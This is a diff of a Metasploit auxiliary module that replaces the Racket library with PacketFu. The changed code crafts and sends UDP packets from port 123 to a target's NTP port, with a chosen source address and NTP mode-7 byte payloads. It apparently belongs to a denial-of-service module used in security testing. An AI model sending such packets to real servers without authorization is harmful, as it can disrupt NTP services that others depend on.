@@ -10,8 +10,6 @@
 ##
 
 require 'msf/core'
-require 'racket'
-
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -57,25 +55,16 @@ class Metasploit3 < Msf::Auxiliary
 
 		open_pcap
 
-		n = Racket::Racket.new
+		p = PacketFu::UDPPacket.new
+		p.ip_saddr = datastore['LHOST']
+		p.ip_daddr = ip
+		p.ip_ttl = 255
+		p.udp_src = 123
+		p.udp_dst = 123
+		p.payload = ["\x17", "\x97\x00\x00\x00"][rand(2)]
+		p.recalc
+		capture_sendto(p,ip)
 
-		n.l3 = Racket::L3::IPv4.new
-		n.l3.src_ip = datastore['LHOST']
-		n.l3.dst_ip = ip
-		n.l3.protocol = 17
-		n.l3.id = rand(0xffff)+1
-		n.l3.ttl = 255
-
-		n.l4 = Racket::L4::UDP.new
-		n.l4.src_port = 123
-		n.l4.dst_port = 123
-		n.l4.payload  = ["\x17","\x97\x00\x00\x00"][rand(2)]
-
-		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)
-
-		buff = n.pack
-
-		capture_sendto(buff, ip)
 		close_pcap
 	end
 
